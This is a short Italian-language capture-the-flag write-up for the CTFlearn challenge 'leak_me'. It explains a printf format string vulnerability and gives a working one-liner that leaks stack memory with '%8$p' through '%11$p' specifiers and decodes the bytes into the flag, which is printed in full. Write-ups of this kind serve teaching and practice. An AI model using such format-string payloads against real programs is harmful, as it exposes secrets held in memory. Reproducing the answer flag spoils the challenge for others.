# leak_me - PWN (Format String leak)

**Flag:** `CTFlearn{1_l1k3_f0rm4t_t4g5_t00}`

## Analisi
Il programma legge la flag in `char flag[64]` (adiacente a `char buffer[64]`), poi fa `printf(buffer)` sul nostro input **senza format string** --> format string vulnerability. La flag e' sullo stack, subito dopo il buffer: la si legge con `%p`.

## Soluzione - passo per passo
Il flag si trova agli argomenti di formato 8, 9, 10, 11.

1. Entra nella cartella:
   ```
   cd leak_me
   ```
2. Leggi i 4 blocchi e decodificali (little-endian) in un solo comando:
   ```
   echo '%8$p.%9$p.%10$p.%11$p' | ./task 2>/dev/null | sed 's/.*tag? //' | \
   python3 -c "import sys;print(b''.join(int(p,16).to_bytes(8,'little') for p in sys.stdin.read().strip().split('.') if p.startswith('0x')).decode('latin1'))"
   ```
   Output --> `CTFlearn{1_l1k3_f0rm4t_t4g5_t00}`

### Spiegazione 
```
echo '%8$p.%9$p.%10$p.%11$p' | ./task
```
Da' 4 numeri hex; ognuno sono 8 byte ASCII in little-endian:
- `0x6e7261656c465443` --> `CTFlearn`
- `0x5f336b316c5f317b` --> `{1_l1k3_`
- `0x745f74346d723066` --> `f0rm4t_t`
- `0x7d3030745f356734` --> `4g5_t00}`


